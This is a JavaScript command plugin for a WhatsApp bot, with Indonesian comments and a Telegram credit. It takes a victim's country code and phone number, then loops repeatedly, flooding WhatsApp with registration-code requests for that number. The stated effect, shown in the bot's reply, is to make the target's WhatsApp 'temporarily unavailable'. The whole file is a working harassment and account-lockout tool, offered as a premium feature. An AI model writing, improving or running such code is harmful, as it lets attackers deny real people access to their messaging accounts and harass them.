/*
『NOTICE』 Hak cipta dilindungi.
* Script ini dibuat oleh Obscura
* Gunakan dengan bijak.
* Telegram: https://t.me/DelioGalileio
*/

/* 
*/
const { default: makeWaSocket, useMultiFileAuthState } = await (
  await import("@adiwajshing/baileys")
).default;
import pino from "pino";

let handler = async (m, { conn, args, usedPrefix, command, isOwner, text }) => {
  if (!args[0] || !args[1])
    return m.reply(`• *Example :* ${usedPrefix}${command} +62 889-8087-0067`);
  conn.sendMessage(m.chat, { react: { text: "🕒", key: m.key } });
  let capt =
    "WhatsApp tidak tersedia untuk sementara waktu. Silahkan coba lagi dalam 5 menit.";
  conn.sendFile(
    m.chat,
    "https://telegra.ph/file/d083b7ec9b32578148494.jpg",
    "tempory.jpg",
    capt,
    m,
  );
  let start = async () => {
    let ddi = args[0];
    let number = args[1];
    let phoneNumber = ddi + number;
    let delay = (time) => new Promise((res) => setTimeout(res, time));
    let authFile = "temp/" + phoneNumber;
    let { state, saveCreds } = await useMultiFileAuthState(authFile);

    const spam = makeWaSocket({
      auth: state,
      mobile: true,
      logger: pino({ level: "silent" }),
    });

    await delay(5000);
    const startTime = Date.now();
    setTimeout(() => {
      start();
    }, 12000);
    while (Date.now() - startTime < 11000) {
      try {
        let res = await spam.requestRegistrationCode({
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724,
        });
        if (res.reason === "temporarily_unavailable") {
          setTimeout(async () => {}, res.retry_after * 1000);
          return;
        }
      } catch (error) {}
    }
  };
  start();
};
handler.help = ["tempory"];
handler.tags = ["tools"];
handler.command = /^tempory|temp$/i;
handler.premium = true; handler.error = 0
handler.limit = true; handler.error = 0
handler.private = false;
export default handler;
